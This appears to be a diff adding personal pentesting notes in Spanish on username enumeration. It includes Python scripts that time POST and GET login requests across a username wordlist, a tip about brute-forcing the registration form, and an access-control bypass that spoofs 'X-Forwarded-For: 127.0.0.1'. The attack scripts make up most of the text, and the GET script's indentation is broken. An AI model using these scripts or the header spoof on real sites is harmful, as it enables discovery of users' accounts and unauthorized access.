@@ -1,0 +1,78 @@
+User enum:
+hacer fuerza bruta al login de las siguientes formas:
+
+1)Probar con el login por carteles como "invalid user"
+2)Probar si al poner el user y una contraseña erronea el user sigue apareciendo en el form.
+3)Comprobar el tiempo de respuesta al momento de intentar los logueos. Script en python:
+
+
+post:
+import requests
+import time
+
+# URL a la que se enviarán las solicitudes POST
+url = 'URL'  # Reemplaza esto con la URL real
+
+# Lee la lista de nombres de usuario desde el archivo externo
+with open("diccionario", 'r') as file:
+    usernames = file.read().splitlines()
+
+# Definir la contraseña
+password = 'minga'  # Reemplaza 'tu_contraseña' con la contraseña real
+
+# Recorre la lista de nombres de usuario
+for username in usernames:
+    # Construye el cuerpo de la solicitud POST con los datos del usuario y contraseña
+    data = {'userid': username, 'passwd': password}  # Reemplaza 'userid' y 'passwd' con los nombres de campo reales
+
+    start_time = time.time()  # Registra el tiempo de inicio
+
+    # Realiza la solicitud POST
+    response = requests.post(url, data=data)
+
+    # Calcula el tiempo transcurrido
+    elapsed_time = round(time.time() - start_time,3)
+
+    # Imprime el nombre de usuario y el tiempo de respuesta
+    print(f'Usuario: {username}, Tiempo de respuesta: {elapsed_time} segundos')
+
+    # Puedes agregar código adicional para procesar la respuesta aquí si es necesario
+
+    Get:
+    import requests
+  import time
+
+  # URL a la que se enviarán las solicitudes GET
+  url = 'https://example.com/login'  # Reemplaza esto con la URL real
+
+  # Lee la lista de nombres de usuario desde el archivo externo
+  with open('usuarios.txt', 'r') as file:
+    usernames = file.read().splitlines()
+
+  # Recorre la lista de nombres de usuario
+  for username in usernames:
+    # Construye la URL con el nombre de usuario como parámetro
+    params = {'Username': username, 'Password': 'tu_contraseña'}  # Reemplaza 'tu_contraseña' con la contraseña real
+    start_time = time.time()  # Registra el tiempo de inicio
+
+    # Realiza la solicitud GET
+    response = requests.get(url, params=params)
+
+    # Calcula el tiempo transcurrido
+    elapsed_time = round(time.time() - start_time,3)
+
+    # Imprime el nombre de usuario y el tiempo de respuesta
+    print(f'Usuario: {username}, Tiempo de respuesta: {elapsed_time} segundos')
+
+    # Puedes agregar código adicional para procesar la respuesta aquí si es necesario
+
+
+4)Hacer fuerza bruta en el formulario de registro buscando en las respuestas los users que ya están registrados.
+
+
+
+#############Buscar entrar a un sitio por confianza en la ip:
+
+Agregando la cabecera "X-Forwarded-For" y una ip de confianza como "127.0.0.1"
+
+
